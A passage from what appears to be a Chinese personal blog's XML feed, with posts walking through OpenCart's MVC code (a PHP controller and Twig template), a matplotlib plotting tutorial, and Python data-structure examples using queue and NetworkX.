可以很清晰的看到，是一大堆的字符串与变量连接的sql语句，所以说Model部分是完全负责与数据库的交互，只要和Controller定义了接口，也就是每个函数的传参规定，就可以从业务逻辑和前端渲染完全脱离开来进行开发。当然这部分的安全是需要时刻小心的。可以看到上面的用户可用参数都运用了escape函数来进行过滤处理，降低sql注入的风险。由于我们分析的是修改操作，所以在Model这边没有回传数据，只是默默地对数据库进行update操作。现在我们看完了CM（controller和Model）,接着就是理解Controller是如何和View进行操作的。我们将看到ControllerCustomerCustomer类中的getForm方法的实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289protected function getForm() &#123; $data['text_form'] = !isset($this-&gt;request-&gt;get['customer_id']) ? $this-&gt;language-&gt;get('text_add') : $this-&gt;language-&gt;get('text_edit'); $data['user_token'] = $this-&gt;session-&gt;data['user_token']; if (isset($this-&gt;request-&gt;get['customer_id'])) &#123; $data['customer_id'] = (int)$this-&gt;request-&gt;get['customer_id']; &#125; else &#123; $data['customer_id'] = 0; &#125; if (isset($this-&gt;error['warning'])) &#123; $data['error_warning'] = $this-&gt;error['warning']; &#125; else &#123; $data['error_warning'] = ''; &#125; if (isset($this-&gt;error['firstname'])) &#123; $data['error_firstname'] = $this-&gt;error['firstname']; &#125; else &#123; $data['error_firstname'] = ''; &#125; if (isset($this-&gt;error['lastname'])) &#123; $data['error_lastname'] = $this-&gt;error['lastname']; &#125; else &#123; $data['error_lastname'] = ''; &#125; if (isset($this-&gt;error['email'])) &#123; $data['error_email'] = $this-&gt;error['email']; &#125; else &#123; $data['error_email'] = ''; &#125; if (isset($this-&gt;error['telephone'])) &#123; $data['error_telephone'] = $this-&gt;error['telephone']; &#125; else &#123; $data['error_telephone'] = ''; &#125; if (isset($this-&gt;error['cheque'])) &#123; $data['error_cheque'] = $this-&gt;error['cheque']; &#125; else &#123; $data['error_cheque'] = ''; &#125; if (isset($this-&gt;error['paypal'])) &#123; $data['error_paypal'] = $this-&gt;error['paypal']; &#125; else &#123; $data['error_paypal'] = ''; &#125; if (isset($this-&gt;error['bank_account_name'])) &#123; $data['error_bank_account_name'] = $this-&gt;error['bank_account_name']; &#125; else &#123; $data['error_bank_account_name'] = ''; &#125; if (isset($this-&gt;error['bank_account_number'])) &#123; $data['error_bank_account_number'] = $this-&gt;error['bank_account_number']; &#125; else &#123; $data['error_bank_account_number'] = ''; &#125; if (isset($this-&gt;error['password'])) &#123; $data['error_password'] = $this-&gt;error['password']; &#125; else &#123; $data['error_password'] = ''; &#125; if (isset($this-&gt;error['confirm'])) &#123; $data['error_confirm'] = $this-&gt;error['confirm']; &#125; else &#123; $data['error_confirm'] = ''; &#125; if (isset($this-&gt;error['custom_field'])) &#123; $data['error_custom_field'] = $this-&gt;error['custom_field']; &#125; else &#123; $data['error_custom_field'] = array(); &#125; if (isset($this-&gt;error['address'])) &#123; $data['error_address'] = $this-&gt;error['address']; &#125; else &#123; $data['error_address'] = array(); &#125; $url = ''; if (isset($this-&gt;request-&gt;get['filter_name'])) &#123; $url .= '&amp;filter_name=' . urlencode(html_entity_decode($this-&gt;request-&gt;get['filter_name'], ENT_QUOTES, 'UTF-8')); &#125; if (isset($this-&gt;request-&gt;get['filter_email'])) &#123; $url .= '&amp;filter_email=' . urlencode(html_entity_decode($this-&gt;request-&gt;get['filter_email'], ENT_QUOTES, 'UTF-8')); &#125; if (isset($this-&gt;request-&gt;get['filter_customer_group_id'])) &#123; $url .= '&amp;filter_customer_group_id=' . $this-&gt;request-&gt;get['filter_customer_group_id']; &#125; if (isset($this-&gt;request-&gt;get['filter_status'])) &#123; $url .= '&amp;filter_status=' . $this-&gt;request-&gt;get['filter_status']; &#125; if (isset($this-&gt;request-&gt;get['filter_ip'])) &#123; $url .= '&amp;filter_ip=' . $this-&gt;request-&gt;get['filter_ip']; &#125; if (isset($this-&gt;request-&gt;get['filter_date_added'])) &#123; $url .= '&amp;filter_date_added=' . $this-&gt;request-&gt;get['filter_date_added']; &#125; if (isset($this-&gt;request-&gt;get['sort'])) &#123; $url .= '&amp;sort=' . $this-&gt;request-&gt;get['sort']; &#125; if (isset($this-&gt;request-&gt;get['order'])) &#123; $url .= '&amp;order=' . $this-&gt;request-&gt;get['order']; &#125; if (isset($this-&gt;request-&gt;get['page'])) &#123; $url .= '&amp;page=' . $this-&gt;request-&gt;get['page']; &#125; $data['breadcrumbs'] = array(); $data['breadcrumbs'][] = array( 'text' =&gt; $this-&gt;language-&gt;get('text_home'), 'href' =&gt; $this-&gt;url-&gt;link('common/dashboard', 'user_token=' . $this-&gt;session-&gt;data['user_token']) ); $data['breadcrumbs'][] = array( 'text' =&gt; $this-&gt;language-&gt;get('heading_title'), 'href' =&gt; $this-&gt;url-&gt;link('customer/customer', 'user_token=' . $this-&gt;session-&gt;data['user_token'] . $url) ); if (!isset($this-&gt;request-&gt;get['customer_id'])) &#123; $data['action'] = $this-&gt;url-&gt;link('customer/customer/add', 'user_token=' . $this-&gt;session-&gt;data['user_token'] . $url); &#125; else &#123; $data['action'] = $this-&gt;url-&gt;link('customer/customer/edit', 'user_token=' . $this-&gt;session-&gt;data['user_token'] . '&amp;customer_id=' . $this-&gt;request-&gt;get['customer_id'] . $url); &#125; $data['cancel'] = $this-&gt;url-&gt;link('customer/customer', 'user_token=' . $this-&gt;session-&gt;data['user_token'] . $url); if (isset($this-&gt;request-&gt;get['customer_id']) &amp;&amp; ($this-&gt;request-&gt;server['REQUEST_METHOD'] != 'POST')) &#123; $customer_info = $this-&gt;model_customer_customer-&gt;getCustomer($this-&gt;request-&gt;get['customer_id']); &#125; $this-&gt;load-&gt;model('customer/customer_group'); $data['customer_groups'] = $this-&gt;model_customer_customer_group-&gt;getCustomerGroups(); if (isset($this-&gt;request-&gt;post['customer_group_id'])) &#123; $data['customer_group_id'] = $this-&gt;request-&gt;post['customer_group_id']; &#125; elseif (!empty($customer_info)) &#123; $data['customer_group_id'] = $customer_info['customer_group_id']; &#125; else &#123; $data['customer_group_id'] = $this-&gt;config-&gt;get('config_customer_group_id'); &#125; if (isset($this-&gt;request-&gt;post['firstname'])) &#123; $data['firstname'] = $this-&gt;request-&gt;post['firstname']; &#125; elseif (!empty($customer_info)) &#123; $data['firstname'] = $customer_info['firstname']; &#125; else &#123; $data['firstname'] = ''; &#125; if (isset($this-&gt;request-&gt;post['lastname'])) &#123; $data['lastname'] = $this-&gt;request-&gt;post['lastname']; &#125; elseif (!empty($customer_info)) &#123; $data['lastname'] = $customer_info['lastname']; &#125; else &#123; $data['lastname'] = ''; &#125; if (isset($this-&gt;request-&gt;post['email'])) &#123; $data['email'] = $this-&gt;request-&gt;post['email']; &#125; elseif (!empty($customer_info)) &#123; $data['email'] = $customer_info['email']; &#125; else &#123; $data['email'] = ''; &#125; if (isset($this-&gt;request-&gt;post['telephone'])) &#123; $data['telephone'] = $this-&gt;request-&gt;post['telephone']; &#125; elseif (!empty($customer_info)) &#123; $data['telephone'] = $customer_info['telephone']; &#125; else &#123; $data['telephone'] = ''; &#125; // Custom Fields $this-&gt;load-&gt;model('customer/custom_field'); $data['custom_fields'] = array(); $filter_data = array( 'sort' =&gt; 'cf.sort_order', 'order' =&gt; 'ASC' ); $custom_fields = $this-&gt;model_customer_custom_field-&gt;getCustomFields($filter_data); foreach ($custom_fields as $custom_field) &#123; $data['custom_fields'][] = array( 'custom_field_id' =&gt; $custom_field['custom_field_id'], 'custom_field_value' =&gt; $this-&gt;model_customer_custom_field-&gt;getCustomFieldValues($custom_field['custom_field_id']), 'name' =&gt; $custom_field['name'], 'value' =&gt; $custom_field['value'], 'type' =&gt; $custom_field['type'], 'location' =&gt; $custom_field['location'], 'sort_order' =&gt; $custom_field['sort_order'] ); &#125; if (isset($this-&gt;request-&gt;post['custom_field'])) &#123; $data['account_custom_field'] = $this-&gt;request-&gt;post['custom_field']; &#125; elseif (!empty($customer_info)) &#123; $data['account_custom_field'] = json_decode($customer_info['custom_field'], true); &#125; else &#123; $data['account_custom_field'] = array(); &#125; if (isset($this-&gt;request-&gt;post['newsletter'])) &#123; $data['newsletter'] = $this-&gt;request-&gt;post['newsletter']; &#125; elseif (!empty($customer_info)) &#123; $data['newsletter'] = $customer_info['newsletter']; &#125; else &#123; $data['newsletter'] = ''; &#125; if (isset($this-&gt;request-&gt;post['status'])) &#123; $data['status'] = $this-&gt;request-&gt;post['status']; &#125; elseif (!empty($customer_info)) &#123; $data['status'] = $customer_info['status']; &#125; else &#123; $data['status'] = true; &#125; if (isset($this-&gt;request-&gt;post['safe'])) &#123; $data['safe'] = $this-&gt;request-&gt;post['safe']; &#125; elseif (!empty($customer_info)) &#123; $data['safe'] = $customer_info['safe']; &#125; else &#123; $data['safe'] = 0; &#125; if (isset($this-&gt;request-&gt;post['password'])) &#123; $data['password'] = $this-&gt;request-&gt;post['password']; &#125; else &#123; $data['password'] = ''; &#125; if (isset($this-&gt;request-&gt;post['confirm'])) &#123; $data['confirm'] = $this-&gt;request-&gt;post['confirm']; &#125; else &#123; $data['confirm'] = ''; &#125; $this-&gt;load-&gt;model('localisation/country'); $data['countries'] = $this-&gt;model_localisation_country-&gt;getCountries(); if (isset($this-&gt;request-&gt;post['address'])) &#123; $data['addresses'] = $this-&gt;request-&gt;post['address']; &#125; elseif (isset($this-&gt;request-&gt;get['customer_id'])) &#123; $data['addresses'] = $this-&gt;model_customer_customer-&gt;getAddresses($this-&gt;request-&gt;get['customer_id']); &#125; else &#123; $data['addresses'] = array(); &#125; if (isset($this-&gt;request-&gt;post['default'])) &#123; $data['default'] = $this-&gt;request-&gt;post['default']; &#125; elseif (!empty($customer_info)) &#123; $data['default'] = array_search($customer_info['address_id'], array_column($data['addresses'], 'address_id')); &#125; else &#123; $data['default'] = ''; &#125; $data['header'] = $this-&gt;load-&gt;controller('common/header'); $data['column_left'] = $this-&gt;load-&gt;controller('common/column_left'); $data['footer'] = $this-&gt;load-&gt;controller('common/footer'); $this-&gt;response-&gt;setOutput($this-&gt;load-&gt;view('customer/customer_form', $data)); &#125; 其实这个部分就是把前台View需要用到的事先约定的一些变量名，通过$data字典的形式传递，所有的这些$data字典的key值要么直接来自于post，get请求或者请求头，要么来自于数据库查询，要么来自业务自定义。最后通过$this-&gt;load-&gt;view(‘customer/customer_form’, $data)传递给前台View,从而继续进行渲染。紧接着我们来一窥customer/customer_form: 12345678910111213141516171819202122&#123;&#123; header &#125;&#125;&#123;&#123; column_left &#125;&#125;&lt;div id="content"&gt; &lt;div class="page-header"&gt; &lt;div class="container-fluid"&gt; &lt;div class="float-right"&gt; &lt;button type="submit" form="form-customer" data-toggle="tooltip" title="&#123;&#123; button_save &#125;&#125;" class="btn btn-primary"&gt;&lt;i class="fas fa-save"&gt;&lt;/i&gt;&lt;/button&gt; &lt;a href="&#123;&#123; cancel &#125;&#125;" data-toggle="tooltip" title="&#123;&#123; button_cancel &#125;&#125;" class="btn btn-light"&gt;&lt;i class="fas fa-reply"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt; &lt;h1&gt;&#123;&#123; heading_title &#125;&#125;&lt;/h1&gt; &lt;ol class="breadcrumb"&gt; &#123;% for breadcrumb in breadcrumbs %&#125; &lt;li class="breadcrumb-item"&gt;&lt;a href="&#123;&#123; breadcrumb.href &#125;&#125;"&gt;&#123;&#123; breadcrumb.text &#125;&#125;&lt;/a&gt;&lt;/li&gt; &#123;% endfor %&#125; &lt;/ol&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="container-fluid"&gt; &#123;% if error_warning %&#125; &lt;div class="alert alert-danger alert-dismissible"&gt;&lt;i class="fas fa-exclamation-circle"&gt;&lt;/i&gt; &#123;&#123; error_warning &#125;&#125; &lt;button type="button" class="close" data-dismiss="alert"&gt;&amp;times;&lt;/button&gt; &lt;/div&gt; &#123;% endif %&#125;......(此处省略N多行) 可以看到上面的twig前端语言基本双大括号里面的变量就是我们$data变量的key值，同样twig模板一些命令控制语句，可以用来减少html代码的编写量和处理简单的output逻辑，剩下的基本就是html的标签，就是普通的html文本。最后通过渲染引擎呈现给客户端。我们按下保存可以看到返回的界面如下； 红圈是我们这次的处理逻辑按钮，蓝色圈的按钮是和本次处理逻辑类似的连个业务，而黑色圈的语句就是调用了language模块返回的语句，可以参考上面的admin/language/customer/customer/customer.php language文件。 小结这是一篇总结自己学习MVC的不成熟笔记，主要以opencart为例，很多细节仍旧没有涉及，相关的理解或许仍旧有不到位的地方。今后会专门学习几个MVC的web框架来增强自己的理解和提升自己的架构能力。在这个分析的过程中逐渐有点理解到框架的力量和架构好的代码大致是个什么样子，ok,路还很长，且行且珍惜！]]></content>
      <tags>
        <tag>php</tag>
        <tag>MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python matplotlib 画图]]></title>
    <url>%2F2018%2F12%2F05%2Fpython-matplotlib-%E7%94%BB%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[常规操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import matplotlib.pyplot as pltimport numpy as npplt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号#绘图数据生成x = np.linspace(-10,10,1000)# 设置整体画布样式,可使用print(plt.style.available)#plt.style.use('ggplot')#定制化线条样式和颜色,参数名可以全程也可以缩写，如linestyle==ls;lineweight==lw......plt.plot(x,np.cos(x),ls='-',color="#000000",label="cos(x)")plt.plot(x,np.sin(x),ls=':',color="r",label="sin(x)")#设置显示标注的位置plt.legend(loc='best',title='图例') #设置x,y轴的标注范围plt.xlim([0,10]) plt.ylim(-1,1)#设置x,y轴的label以及边框美化,注意到字符串支持letax语法box=dict(facecolor='#6959CD',pad=2,alpha=.4)plt.xlabel("$x$",fontsize=20,bbox=box) plt.ylabel("$y=sin(x) or cos(x)$",fontsize=20,bbox=box) #设置网格线plt.grid(c="gray",ls=':')#绘制参考基准线，垂直于x轴或者垂直于y轴plt.axhline(0.25,ls='-',lw=2,c='y')plt.axvline(4,ls='-',lw=2,c='y')#绘制参考区域plt.axvspan(xmin=6,xmax=8,facecolor='gray',alpha=.6)plt.axhspan(ymin=-0.5,ymax=0,facecolor='gray',alpha=.6)#添加无指向性文本plt.text(2.8,0.25,"无指向",color='r',bbox=box)#添加指向性文本,注意到arrowprops指示被注释内容的箭头的属性字典plt.annotate("max--有指向",xy=(np.pi/2,1),xytext=(3,0.75),color='b',bbox=box,arrowprops=dict(arrowstyle='-&gt;',connectionstyle='arc3',color='b'))#添加文章标题plt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号plt.title("plot类常规作图")plt.show() 常用的绘图类型柱状图1234567891011121314151617181920# 柱状图x=[1,2,3,4,5,6]y=[3,1,2,6,7,9]plt.style.use('ggplot')plt.bar(x,y,align='center',color='red',tick_label=["类1",'类2','类3','类4','类5','类6'])plt.xlabel("类别")plt.ylabel("质量/kg")plt.show()#堆叠柱状图name_list = ['Monday','Tuesday','Friday','Sunday']num_list = [1.5,0.6,7.8,6]num_list1 = [1,2,3,1]plt.bar(range(len(num_list)), num_list, label='boy',fc = 'y')plt.bar(range(len(num_list)), num_list1, bottom=num_list, label='girl',tick_label = name_list,fc = 'r')plt.legend()plt.show() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051'''x包含所有柱子的下标的列表height包含所有柱子的高度值的列表width每个柱子的宽度。可以指定一个固定值，那么所有的柱子都是一样的宽。或者设置一个列表，这样可以分别对每个柱子设定不同的宽度。align柱子对齐方式，有两个可选值：center和edge。center表示每根柱子是根据下标来对齐, edge则表示每根柱子全部以下标为起点，然后显示到下标的右边。如果不指定该参数，默认值是center。其他可选参数有：color每根柱子呈现的颜色。同样可指定一个颜色值，让所有柱子呈现同样颜色；或者指定带有不同颜色的列表，让不同柱子显示不同颜色。edgecolor每根柱子边框的颜色。同样可指定一个颜色值，让所有柱子边框呈现同样颜色；或者指定带有不同颜色的列表，让不同柱子的边框显示不同颜色。linewidth每根柱子的边框宽度。如果没有设置该参数，将使用默认宽度，默认是没有边框。tick_label每根柱子上显示的标签，默认是没有内容。xerr每根柱子顶部在横轴方向的线段。如果指定一个固定值，所有柱子的线段将一直长；如果指定一个带有不同长度值的列表，那么柱子顶部的线段将呈现不同长度。yerr每根柱子顶端在纵轴方向的线段。如果指定一个固定值，所有柱子的线段将一直长；如果指定一个带有不同长度值的列表，那么柱子顶部的线段将呈现不同长度。ecolor设置 xerr 和 yerr 的线段的颜色。同样可以指定一个固定值或者一个列表。capsize这个参数很有趣, 对xerr或者yerr的补充说明。一般为其设置一个整数，例如 10。如果你已经设置了yerr 参数，那么设置 capsize 参数，会在每跟柱子顶部线段上面的首尾部分增加两条垂直原来线段的线段。对 xerr 参数也是同样道理。可能看说明会觉得绕，如果你看下图就一目了然了。error_kw设置 xerr 和 yerr 参数显示线段的参数，它是个字典类型。如果你在该参数中又重新定义了 ecolor 和 capsize，那么显示效果以这个为准。log这个参数，我暂时搞不懂有什么用。orientation设置柱子是显示方式。设置值为 vertical ，那么显示为柱形图。如果设置为 horizontal 条形图。不过 matplotlib 官网不建议直接使用这个来绘制条形图，使用barh来绘制条形图。''' 条形图1234567891011121314151617# 条形图x=[1,2,3,4,5,6]y=[3,1,2,6,7,9]plt.barh(x,y,align='center',color='red',tick_label=["类1",'类2','类3','类4','类5','类6'])plt.ylabel("类别")plt.xlabel("质量/kg")plt.show()#正负条形图a = np.array([5, 20, 15, 25, 10])b = np.array([10, 15, 20, 15, 5])plt.barh(range(len(a)), a)plt.barh(range(len(b)), -b)plt.show() 直方图12345678910111213141516171819# 常规直方图import numpy as npboxweight=np.random.randint(0,10,100)y=range(0,11,1)plt.hist(boxweight,y,histtype='bar',color='g',alpha=.7,label='例子')plt.legend()plt.show()#多类别直方图# 分别生成10000 ， 5000 ， 2000 个值x_multi = [np.random.randn(n) for n in [10000, 5000, 2000]]plt.hist(x_multi, 10, histtype='bar',label=list("ABC"))plt.title('多类型直方图')plt.legend()plt.show() 123456789101112131415161718192021222324252627282930313233'''x：指定要绘制直方图的数据；bins：指定直方图条形的个数；range：指定直方图数据的上下界，默认包含绘图数据的最大值和最小值；normed：是否将直方图的频数转换成频率；weights：该参数可为每一个数据点设置权重；cumulative：是否需要计算累计频数或频率；bottom：可以为直方图的每个条形添加基准线，默认为0；histtype：指定直方图的类型，默认为bar，除此还有’barstacked’, ‘step’, ‘stepfilled’；align：设置条形边界值的对其方式，默认为mid，除此还有’left’和’right’；orientation：设置直方图的摆放方向，默认为垂直方向；rwidth：设置直方图条形宽度的百分比；log：是否需要对绘图数据进行log变换；color：设置直方图的填充色；label：设置直方图的标签，可通过legend展示其图例；stacked：当有多个数据时，是否需要将直方图呈堆叠摆放，默认水平摆放；alpha：透明度，浮点数。''' 饼图12345678910111213141516171819202122232425262728293031323334353637labels = [u'大型',u'中型',u'小型',u'微型'] #定义标签sizes = [46,253,321,66] #每块值colors = ['red','yellowgreen','lightskyblue','yellow'] #每块颜色定义explode = (.05,.05,.05,.05) #将某一块分割出来，值越大分割出的间隙越大patches,text1,text2 = plt.pie(sizes, explode=explode, labels=labels, radius=1, #图例半径 colors=colors, labeldistance = 1.2, #图例距圆心半径倍距离 autopct = '%3.2f%%', #数值保留固定小数位 shadow = True, #阴影设置 startangle =90, #逆时针起始角度设置 wedgeprops=dict(width=0.7,edgecolor='w'),#设置图形厚度以及边缘颜色 pctdistance = .6) #数值距圆心半径倍数距离#patches饼图的返回值，texts1饼图外label的文本，texts2饼图内部文本plt.legend()plt.show()size = 0.3vals = np.array([[60., 32.], [37., 40.], [29., 10.]])cmap = plt.get_cmap("tab20c")outer_colors = cmap(np.arange(3)*4)inner_colors = cmap(np.array([1, 2, 5, 6, 9, 10]))plt.pie(vals.sum(axis=1), radius=1-size, colors=outer_colors,autopct = '%2.1f%%',pctdistance = .7, wedgeprops=dict(width=size, edgecolor='w'))plt.pie(vals.flatten(), colors=inner_colors,autopct = '%2.1f%%',pctdistance = .85, wedgeprops=dict(width=size, edgecolor='w'))plt.show() 图形分布1234567891011121314#方法一t=np.arange(0.0,2.0,0.1)s=np.sin(t*np.pi)plt.subplot(2,2,1) #要生成两行两列，这是第一个图plt.subplot('行','列','编号')plt.plot(t,s,'b--')plt.ylabel('y1')plt.subplot(2,2,2) #两行两列,这是第二个图plt.plot(2*t,s,'r--')plt.ylabel('y2')plt.subplot(2,2,3)#两行两列,这是第三个图plt.plot(3*t,s,'m--')plt.subplot(2,2,4)#两行两列,这是第四个图plt.plot(4*t,s,'k--')plt.show() 1234567#方法二t=np.arange(0.0,2.0,0.1)s=np.sin(t*np.pi)figure,ax=plt.subplots(2,2)ax[0][0].plot(t,s,'r*')ax[0][1].plot(t*2,s,'b--')plt.show() 123456789101112131415161718192021222324252627282930313233343536373839404142434445# 坐标轴共享t=np.arange(0.0,2.0,0.1)s=np.sin(t*np.pi)figure,ax=plt.subplots(2,2)ax[0][0].plot(t,s,'r*')ax[0][1].plot(t*2,s,'b-')ax[1][0].plot(t,s,'r*')ax[1][1].plot(t,s*2,'b-')plt.show()figure,ax=plt.subplots(2,2,sharex="all",sharey="all")ax[0][0].plot(t,s,'r*')ax[0][1].plot(t*2,s,'b-')ax[1][0].plot(t,s,'r*')ax[1][1].plot(t,s*2,'b-')plt.show()figure,ax=plt.subplots(2,2,sharex="row")#cloax[0][0].plot(t,s,'r*')ax[0][1].plot(t*2,s,'b-')ax[1][0].plot(t,s,'r*')ax[1][1].plot(t,s*2,'b-')plt.show()#共享个别图例坐标，如ax1和ax4figure,ax=plt.subplots(2,2)ax1=plt.subplot(221)ax1.plot(t,s,'r*')ax[0][1].plot(t*2,s,'b-')ax[1][0].plot(t,s,'r*')ax4=plt.subplot(224,sharex=ax1)ax4.plot(t,s*2,'b-')plt.show()#将共享坐标抽子区间空隙去掉figure,ax=plt.subplots(2,2,sharex="all",sharey="all")figure.subplots_adjust(hspace=0,wspace=0)ax[0][0].plot(t,s,'r*')ax[0][1].plot(t*2,s,'b-')ax[1][0].plot(t,s,'r*')ax[1][1].plot(t,s*2,'b-')plt.show() 参考文献[1] https://matplotlib.org/api/_as_gen/matplotlib.pyplot.html#module-matplotlib.pyplot]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让数据结构pythonic]]></title>
    <url>%2F2018%2F11%2F29%2F%E8%AE%A9%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84pythonic%2F</url>
    <content type="text"><![CDATA[琢磨着也到了不大不小的年纪，恰逢今年寒假打算打一波数模美赛，负责编程，所以平时抽点时间，用这一个半月重新把数据结构的相关内容捡起来，同时把之前看得不系统的python数据处理相关的知识系统化。最后决定以一门新的语言——python,来学习或者说是温习一下数据结构（之前学的是c），以及python进行数据处理的相关内容。 线性表看到一些文章和书籍上在线性表这块是自己定义类来实现的，甚至有些教材上直接在类中使用的是python自带的数据类型——列表。但是仔细思考一番线性表应该提供的一些操作，python内置的列表基本完全胜任，所以笔者认为，出于学习目的无可厚非，但要是真的在实践中这样做，不得不说有点画蛇添足。如果真的只是抱着学习线性表的构建的初衷也无可厚非，但感觉要学习还是直蹦底层的使用c或c++基于指针或者类的方式构建，收益更大。笔者使用python只是本着实用的目的，所以就不会依葫芦画瓢，我认为用python内置的列表对象及其方法，外加个迭代，就已经很好了。 堆栈和队列在python中没有与这两个数据结构类型直接关联的数据对象，但是有一些库可以提供队列的操作，如Queue库，里面集成了FIFO，LIFO的两种队列，其实也就是队列和堆栈没错了。所以本着pythonic的思想，完全可以不必要自己去实现堆栈，不过硬要实现起来，使用list对象，将其一些拓展操作封装成Stack，Queue，实现起来也比较方便。 12345678910111213141516171819202122import queueFIFO=queue.Queue(10) #创建一个最大长度为10的FIFO队列,数据结构中的队列if not FIFO.full(): FIFO.put("hello")FIFO.qsize()if not FIFO.empty(): item=FIFO.get()FIFO.qsize()LIFO=queue.LifoQueue(10) #创建一个最大长度为10的LIFO队列，数据结构中的栈if not LIFO.full(): LIFO.put("hello")if not LIFO.full(): LIFO.put(3) FIFO.qsize()if not LIFO.empty(): item1=LIFO.get()item2=LIFO.get()item2 &#39;hello&#39; 图图这一块是比较的复杂，但是python的networkx库可以给我们构建图或者是基于图这个数据结构来进行分析带来了很大的便利。 邻接列表表示法1234567891011a,b,c,d,e,f,g=range(7)N=[ &#123;b:2,c:1,d:2&#125;, #a &#123;c:4,e:3&#125;, #b &#123;d:8&#125;, #c &#123;e,7&#125;, #d &#123;f:5&#125;, #e &#123;f:1,c:6&#125;, #f &#123;f:9,c:7&#125; #g]N [{1: 2, 2: 1, 3: 2}, {2: 4, 4: 3}, {3: 8}, {4, 7}, {5: 5}, {5: 1, 2: 6}, {5: 9, 2: 7}] 邻接矩阵表示法123456789a,b,c,d,e,f,g=range(7)N=[[0,1,0,1,0,1,1], [1,0,0,0,0,0,1], [0,1,0,1,0,0,1], [1,0,0,0,0,0,0], [0,0,1,1,0,0,1], [1,0,0,0,1,1,1], [1,0,1,0,0,0,1]]N [[0, 1, 0, 1, 0, 1, 1], [1, 0, 0, 0, 0, 0, 1], [0, 1, 0, 1, 0, 0, 1], [1, 0, 0, 0, 0, 0, 0], [0, 0, 1, 1, 0, 0, 1], [1, 0, 0, 0, 1, 1, 1], [1, 0, 1, 0, 0, 0, 1]] 123#当然为了方便，我们也可以直接调用numpy库直接初始化一个邻接矩阵import numpy as npN=np.zeros([7,7])#初始化一个7节点的图，邻接举证的方式 可以看到因为在python内置了列表和字典这两种数据结构，这就使得我们构建图的过程更加直观和简单。当然构建图的方式不局限于上述的实现方式，其实我们可以参考以上的思路，利用python的特性，如字典，列表和集合对象，十分自由方便的创建我们自己数据结构。 NetworkX第三方库这个库可以说是相当的强大了，内置了很多图的分析算法，Prim，Dijkstra等等……,具体的可以参考（https://networkx.github.io/documentation/networkx-1.10/reference/algorithms.html） 无向图123456789101112131415161718192021222324import networkx as nximport matplotlib.pyplot as plt#建立一个空的无向图GG=nx.Graph()#添加一个节点1G.add_node(1)#添加一条边2-3（隐含着添加了两个节点2、3）G.add_edge(2,3)#对于无向图，边3-2与边2-3被认为是一条边G.add_edge(3,1)#输出全部的节点print(G.nodes())# 添加0-1、1-2和2-3三条边，权重分别是3.0和7.5G.add_weighted_edges_from([(0,1,3.0),(1,2,7.5),(2,3,1.0)])# 如果想读取权重，可以使用get_edge_data方法，它接受两个参数u和v，即边的起始点。print (G.get_edge_data(1,2))#输出全部的边print (G.edges())#输出边的数量print (G.number_of_edges())#输出点数print (G.number_of_nodes())nx.draw(G, with_labels=True)plt.show() [1, 2, 3] {&#39;weight&#39;: 7.5} [(1, 3), (1, 0), (1, 2), (2, 3)] 4 4 有向图123456789101112131415161718import networkx as nxD=nx.DiGraph()#添加一个节点1D.add_node(1)#添加一条边2-3（隐含着添加了两个节点2、3）D.add_edge(2,3)#对于无向图，边3-2与边2-3被认为是一条边D.add_edge(1,2)#输出全部的节点print(D.nodes())#输出全部的边print (D.edges())#输出边的数量print (D.number_of_edges())#输出点数print (D.number_of_nodes())nx.draw(D, with_labels=True)plt.show() [1, 2, 3] [(1, 2), (2, 3)] 2 3 最小生成树1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#生成graph G.clear() G = nx.Graph() G.add_weighted_edges_from([('0','1',2),('0','2',7),('1','2',3),('1','3',8),('1','4',5),('2','3',1),('3','4',4)]) #边和节点信息 edge_labels = nx.get_edge_attributes(G,'weight') labels=&#123;'0':'0','1':'1','2':'2','3':'3','4':'4'&#125; #生成节点位置 pos=nx.spring_layout(G) #把节点画出来 nx.draw_networkx_nodes(G,pos,node_color='g',node_size=500,alpha=0.8) #把边画出来 nx.draw_networkx_edges(G,pos,width=1.0,alpha=0.5,edge_color=['b','r','b','r','r','b','r']) #把节点的标签画出来 nx.draw_networkx_labels(G,pos,labels,font_size=16) #把边权重画出来 nx.draw_networkx_edge_labels(G, pos, edge_labels) #显示graph plt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号plt.title('有权图') plt.axis('on') plt.xticks([]) plt.yticks([]) plt.show() # 最小生成树#求得最小生成树,algorithm可以是kruskal,prim,boruvka一种,默认是kruskal KA = nx.minimum_spanning_tree(G,algorithm='kruskal') print(KA.edges(data=True)) #画出最小生成树edge_labels = nx.get_edge_attributes(G,'weight') nx.draw_networkx_nodes(KA,pos,node_color='g',node_size=500,alpha=0.8) nx.draw_networkx_edges(KA,pos,width=1.0,alpha=0.5) nx.draw_networkx_labels(KA,pos,font_size=16) nx.draw_networkx_edge_labels(G, pos, edge_labels) plt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号plt.title('最小生成树') plt.axis('on') plt.xticks([]) plt.yticks([]) plt.show()#直接拿到构成最小生成树的边,algorithm可以是kruskal,prim,boruvka一种,默认是kruskal mst = nx.minimum_spanning_edges(G, algorithm='kruskal', data=False) edgelist = list(mst) print(edgelist) [(&#39;0&#39;, &#39;1&#39;, {&#39;weight&#39;: 2}), (&#39;1&#39;, &#39;2&#39;, {&#39;weight&#39;: 3}), (&#39;2&#39;, &#39;3&#39;, {&#39;weight&#39;: 1}), 